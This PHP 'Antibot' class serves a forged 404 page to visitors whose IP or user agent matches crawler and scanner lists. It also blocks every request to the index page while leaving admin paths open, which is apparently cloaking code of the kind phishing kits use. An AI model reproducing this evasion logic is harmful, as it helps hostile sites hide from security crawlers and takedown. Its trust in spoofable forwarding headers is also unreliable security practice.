<?php

require "Crawlers.php";
require "IPs.php";

class Antibot {

    private $scanUserAgent;
    private $scanIpAddress;

    public function __construct($scanUserAgent = true, $scanIpAddress = true) {
        $this->scanUserAgent = $scanUserAgent;
        $this->scanIpAddress = $scanIpAddress;
    }

    public function check() {

        if($this->scanIpAddress) {
            if($this->checkIPs()) {
                addLog(1);
                http_response_code(404);
                exit("<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
            }
        }

        if($this->scanUserAgent) {
            if($this->checkUserAgent()) {
                addLog(1);
                http_response_code(404);
                exit("<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
            }
        }

        if($this->checkBannedIp()) {
            http_response_code(404);
            exit("<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
        }

        /*
         * Exclude Admin Panel in Bot protection
         */

        if(strpos($_SERVER["REQUEST_URI"], "admin") !== false) {
            return;
        }

        /*
         * Ban all visitors trying to access index.php
         */
        if(strpos($_SERVER["REQUEST_URI"], "index") !== false || $_SERVER["REQUEST_URI"] === "/") {
            addLog(1);
            http_response_code(404);
            exit("<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
        }

        addLog(0);
    }

    public function checkBannedIp() {
        global $pdo;
        $check = $pdo->prepare("SELECT * FROM bannedips WHERE ip = :ip");
        $check->bindParam("ip", $this->getIp());
        $check->execute();

        return ($check->rowCount() > 0);
    }

    public function checkUserAgent() {
        $userAgent = $_SERVER["HTTP_USER_AGENT"];
        $agents = Crawlers::getRegex();
        $result = preg_match("/{$agents}/i", $userAgent, $matches);
        return (bool) $result;
    }

    public function checkIPs() {
        $ip = $this->getIp();
        foreach (IPs::$data as $checkIp) {
            if (preg_match('/' . $checkIp . '/',$ip)) {
                return true;
            }
        }
    }


    function getIp() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
}